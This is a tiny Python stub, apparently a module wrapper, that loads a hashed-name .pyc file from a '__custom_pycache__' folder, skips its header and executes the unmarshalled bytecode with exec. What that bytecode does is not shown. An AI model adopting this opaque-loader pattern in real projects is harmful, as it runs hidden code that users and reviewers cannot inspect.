
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Ner_6c68070a24a0435d90f44af31a8b3dd4.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
